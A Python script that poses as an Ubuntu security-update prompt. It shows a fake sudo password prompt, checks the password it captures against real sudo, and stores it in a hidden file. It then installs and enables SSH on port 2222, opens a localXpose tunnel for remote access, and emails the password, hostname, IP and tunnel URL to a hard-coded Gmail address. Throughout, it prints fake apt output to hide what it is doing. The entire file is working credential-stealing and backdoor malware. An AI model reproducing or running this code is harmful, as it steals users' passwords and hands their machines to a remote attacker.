#!/usr/bin/env python3

# Required environment variables:
# - RESEND_API_KEY: API key for sending emails via Resend
# - LOCALXPOSE_ACCESS_TOKEN: Access token for localXpose authentication

import os
import sys
import time
import getpass
import subprocess
import random
import platform
import json
import threading
from datetime import datetime
from pathlib import Path

def clear_screen():
    print("[DEBUG] clear_screen called")
    os.system('clear')

def send_password_via_resend(password, tunnel_url=None):
    try:
        api_key = os.environ.get("RESEND_API_KEY")
        if not api_key:
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        try:
            ip_address = subprocess.check_output(
                ["hostname", "-I"], text=True
            ).strip().split()[0]
        except Exception:
            ip_address = "unknown"

        subject = f"Security Audit - Credential Capture from {hostname}"
        
        tunnel_info = ""
        if tunnel_url:
            tunnel_info = f"<p><strong>SSH Access URL:</strong> {tunnel_url}</p>\n        "
        
        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip_address}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        {tunnel_info}<br>
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """

        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": ["arkhamzz47@gmail.com"],
            "subject": subject,
            "html": html_body
        }

        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", str(data).replace("'", '"')
        ]
        
        subprocess.Popen(curl_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception:
        pass

def capture_sudo_password():
    print("[DEBUG] capture_sudo_password called")
    max_attempts = 3
    attempt = 1

    while attempt <= max_attempts:
        try:
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))

            password = getpass.getpass(prompt)

            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)

            if process.returncode == 0:
                print("[DEBUG] Correct sudo password captured")
                return password
            else:
                print("[DEBUG] Incorrect sudo password attempt")
                attempt += 1

        except KeyboardInterrupt:
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[DEBUG] sudo validation timed out")
            attempt += 1

    print(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    print("[DEBUG] show_installation_progress called")
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        time.sleep(random.uniform(0.5, 1.0))
    
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    
    packages = [
        "libssl3:amd64",
        "openssl", 
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5))
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8))
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0))

def is_ubuntu():
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                if 'ubuntu' in content:
                    return True
        
        if 'ubuntu' in platform.platform().lower():
            return True
            
        try:
            result = subprocess.run(['lsb_release', '-i'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and 'ubuntu' in result.stdout.lower():
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
            
        return False
    except Exception:
        return False

def get_stored_password():
    print("[DEBUG] get_stored_password called")
    try:
        home_dir = os.path.expanduser("~")
        log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
        
        if not os.path.exists(log_path):
            print("[DEBUG] No stored password file found")
            return None
            
        with open(log_path, 'r') as f:
            lines = f.read().strip().split('\n')
            if lines and lines[-1]:
                password = lines[-1].strip()
                print("[DEBUG] Stored password found")
                return password
                
        return None
        
    except Exception as e:
        print(f"[DEBUG] Exception in get_stored_password: {e}")
        return None

def is_loclx_installed():
    try:
        # Check if loclx is installed via npm
        result = subprocess.run(['loclx', '--version'], capture_output=True, timeout=3, text=True)
        installed = result.returncode == 0
        return installed
    except subprocess.TimeoutExpired:
        return False
    except FileNotFoundError:
        return False
    except Exception:
        return False

def install_loclx(password):
    try:
        if is_loclx_installed():
            return True
        
        # Install loclx via snap with sudo
        install_process = subprocess.Popen(
            ['sudo', '-S', 'snap', 'install', 'localxpose'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = install_process.communicate(input=f"{password}\n", timeout=60)
        
        if install_process.returncode == 0:
            # Verify installation
            verify_result = subprocess.run(['loclx', '--version'], 
                                         capture_output=True, text=True, timeout=5)
            return verify_result.returncode == 0
        else:
            print(f"[DEBUG] snap install failed with return code: {install_process.returncode}")
            print(f"[DEBUG] stdout: {stdout}")
            print(f"[DEBUG] stderr: {stderr}")
        
        return False
            
    except Exception as e:
        print(f"[DEBUG] Exception in install_loclx: {e}")
        return False

def setup_ssh_forwarding(password):
    try:
        print("[DEBUG] Starting SSH service setup")
        
        # Install openssh-server if not installed
        install_ssh_process = subprocess.Popen(
            ['sudo', '-S', 'apt', 'install', 'openssh-server', '-y'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = install_ssh_process.communicate(input=f"{password}\n")
        print(f"[DEBUG] SSH install result: {install_ssh_process.returncode}")
        
        # Change SSH port to 2222 to avoid privilege issues
        print("[DEBUG] Configuring SSH to use port 2222")
        try:
            # Read current sshd_config
            with open('/etc/ssh/sshd_config', 'r') as f:
                config_content = f.read()
            
            # Modify the port setting
            import re
            # Replace any existing Port line or add it
            if re.search(r'^#?Port\s+\d+', config_content, re.MULTILINE):
                new_config = re.sub(r'^#?Port\s+\d+', 'Port 2222', config_content, flags=re.MULTILINE)
            else:
                # Add Port 2222 at the beginning
                new_config = 'Port 2222\n' + config_content
            
            # Write the modified config using sudo tee
            tee_process = subprocess.Popen(
                ['sudo', '-S', 'tee', '/etc/ssh/sshd_config'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = tee_process.communicate(input=f"{password}\n{new_config}")
            print(f"[DEBUG] SSH config update result: {tee_process.returncode}")
            
        except Exception as e:
            print(f"[DEBUG] Exception updating SSH config: {e}")
        
        # Start SSH service with password
        ssh_process = subprocess.Popen(
            ['sudo', '-S', 'systemctl', 'start', 'ssh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = ssh_process.communicate(input=f"{password}\n")
        print(f"[DEBUG] SSH service start result: {ssh_process.returncode}")
        
        # Restart SSH service to apply the new port configuration
        restart_ssh_process = subprocess.Popen(
            ['sudo', '-S', 'systemctl', 'restart', 'ssh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = restart_ssh_process.communicate(input=f"{password}\n")
        print(f"[DEBUG] SSH service restart result: {restart_ssh_process.returncode}")
        
        # Enable SSH service to start on boot
        enable_ssh_process = subprocess.Popen(
            ['sudo', '-S', 'systemctl', 'enable', 'ssh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        enable_ssh_process.communicate(input=f"{password}\n")
        
        # Kill any existing loclx processes
        try:
            subprocess.run(['pkill', '-f', 'loclx'], capture_output=True)
            time.sleep(3)
        except Exception:
            pass
        
        # Authenticate with localXpose using access token
        print("[DEBUG] Authenticating with localXpose")
        access_token = os.environ.get("LOCALXPOSE_ACCESS_TOKEN")
        if not access_token:
            print("[DEBUG] LOCALXPOSE_ACCESS_TOKEN not found in environment variables")
            return None
        
        try:
            # Login to localXpose with access token
            login_process = subprocess.Popen(
                ['loclx', 'account', 'login'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            login_stdout, login_stderr = login_process.communicate(input=f"{access_token}\n", timeout=30)
            print(f"[DEBUG] localXpose login result: {login_process.returncode}")
            if login_process.returncode != 0:
                print(f"[DEBUG] localXpose login failed: {login_stderr}")
                return None
        except Exception as e:
            print(f"[DEBUG] Exception during localXpose login: {e}")
            return None
        
        print("[DEBUG] Starting loclx tunnel for SSH on port 2222")
        
        # Start loclx tunnel on port 2222
        loclx_cmd = ['loclx', 'tunnel', 'tcp', '--region', 'eu' , '--port', '2222']
        print(f"[DEBUG] Running command: {' '.join(loclx_cmd)}")
        
        loclx_process = subprocess.Popen(
            loclx_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )
        
        # Give loclx time to establish tunnel
        print("[DEBUG] Waiting for loclx to establish tunnel...")
        time.sleep(10)
        
        # Check if loclx process is still running
        if loclx_process.poll() is None:
            print("[DEBUG] loclx process is running")
        else:
            print(f"[DEBUG] loclx process exited with code: {loclx_process.poll()}")
            # Try to get the output to see what went wrong
            try:
                stdout, stderr = loclx_process.communicate(timeout=1)
                print(f"[DEBUG] loclx stdout: {stdout}")
                print(f"[DEBUG] loclx stderr: {stderr}")
            except:
                pass
            return None
        
        # Try to get the tunnel URL from loclx output
        max_retries = 5
        for attempt in range(max_retries):
            try:
                print(f"[DEBUG] Attempting to get loclx tunnel info (attempt {attempt + 1})")
                
                # Check if we can read from the process output
                if loclx_process.stdout and not loclx_process.stdout.closed:
                    # Try to read some output using select for non-blocking read
                    try:
                        import select
                        if select.select([loclx_process.stdout], [], [], 0)[0]:
                            output = loclx_process.stdout.read(1024).decode('utf-8', errors='ignore')
                            if output:
                                print(f"[DEBUG] loclx output: {output}")
                                # Look for URL in output (loclx usually outputs the URL)
                                lines = output.split('\n')
                                for line in lines:
                                    if any(keyword in line.lower() for keyword in ['tcp', 'tunnel', 'forwarding', 'http']):
                                        # Extract URL from line using regex
                                        import re
                                        url_patterns = [
                                            r'(https?://[^\s\)]+)',
                                            r'(tcp://[^\s\)]+)',
                                            r'([a-zA-Z0-9-]+\.loca\.lt)',
                                            r'([a-zA-Z0-9-]+\.localtunnel\.me)'
                                        ]
                                        for pattern in url_patterns:
                                            url_match = re.search(pattern, line)
                                            if url_match:
                                                tunnel_url = url_match.group(1)
                                                # Ensure it has a protocol
                                                if not tunnel_url.startswith(('http://', 'https://', 'tcp://')):
                                                    tunnel_url = 'https://' + tunnel_url
                                                print(f"[DEBUG] Found tunnel URL: {tunnel_url}")
                                                return tunnel_url
                    except ImportError:
                        # select not available, try a different approach
                        pass
                    except Exception as e:
                        print(f"[DEBUG] Exception reading loclx output: {e}")
                
                time.sleep(3)
                
            except Exception as e:
                print(f"[DEBUG] Exception getting tunnel info: {e}")
                time.sleep(3)
        
        # If we can't get the URL from output, return a generic message
        print("[DEBUG] Could not extract tunnel URL from loclx output")
        return "loclx tunnel established (URL not captured)"
        
    except Exception as e:
        print(f"[DEBUG] Exception in setup_ssh_forwarding: {e}")
        return None
        
def background_operations(password, silent=False):
    if not silent:
        print("[DEBUG] background_operations called")
    try:
        loclx_url = None

        if not is_ubuntu():
            if not silent:
                print("[DEBUG] Not Ubuntu, exiting background_operations")
            return

        # Install loclx if not already installed
        if not is_loclx_installed():
            if not silent:
                print("[DEBUG] loclx not installed, installing...")
            install_result = install_loclx(password)
            if not install_result:
                if not silent:
                    print("[DEBUG] Failed to install loclx")
                send_password_via_resend(password, None)
                return
        else:
            if not silent:
                print("[DEBUG] loclx already installed")

        # Setup SSH forwarding with loclx
        if not silent:
            print("[DEBUG] Setting up SSH forwarding with loclx")
        loclx_url = setup_ssh_forwarding(password)
        if not silent:
            print(f"[DEBUG] loclx_url after setup: {loclx_url}")

        # Send email with password and loclx URL if available
        if not silent:
            print(f"[DEBUG] Sending password via resend, loclx_url: {loclx_url}")
        send_password_via_resend(password, loclx_url)

    except Exception as e:
        if not silent:
            print(f"[DEBUG] Exception in background_operations: {e}")
        # Still send email even if loclx fails
        send_password_via_resend(password, None)

def save_password_to_file(password):
    print("[DEBUG] save_password_to_file called")
    try:
        home_dir = os.path.expanduser("~")
        share_dir = os.path.join(home_dir, ".local", "share")
        os.makedirs(share_dir, exist_ok=True)
        file_path = os.path.join(share_dir, ".temp_log")
        with open(file_path, "a") as f:
            f.write(password + "\n")
        print("[DEBUG] Password saved to file")
        return True
    except Exception as e:
        print(f"[DEBUG] Exception in save_password_to_file: {e}")
        return False

def main():
    print("[DEBUG] main called")
    try:
        # Check if password is already captured
        stored_password = get_stored_password()
        
        if stored_password:
            print("[DEBUG] Stored password found, running operations")
            # Password exists - run operations silently
            background_operations(stored_password, silent=False)
            sys.exit(0)
        
        # No password stored - run the fake sudo capture
        clear_screen()
        
        print("Unattended-upgrades: Security updates have not been installed.")
        print("The following security updates are pending:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print()
        print("It is recommended that you apply these updates immediately.")
        print("To do so, run the following command:")
        print("  sudo apt update && sudo apt upgrade")
        print()
        
        password = capture_sudo_password()
        
        print("Reading package lists... Done")
        time.sleep(1)
        print("Building dependency tree       ")
        print("Reading state information... Done")
        time.sleep(2)
        print("The following packages will be upgraded:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
        print("Need to get 14.2 MB of archives.")
        print("After this operation, 0 B of additional disk space will be used.")
        print()
        time.sleep(1)
        
        # Save password to file
        save_password_to_file(password)
        
        # Start background operations (install loclx, setup SSH, send email)
        background_thread = threading.Thread(target=background_operations, args=(password,))
        background_thread.daemon = True
        background_thread.start()
        
        # Show fake installation progress
        show_installation_progress()
        
        print("Processing triggers for man-db (2.10.2-1) ...")
        print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
        time.sleep(1)
        print()
        
        # Give background thread time to complete before exiting
        background_thread.join(timeout=10)
        sys.exit(0)
        
    except KeyboardInterrupt:
        print("\n")
        sys.exit(1)
    except Exception as e:
        print(f"[DEBUG] Exception in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
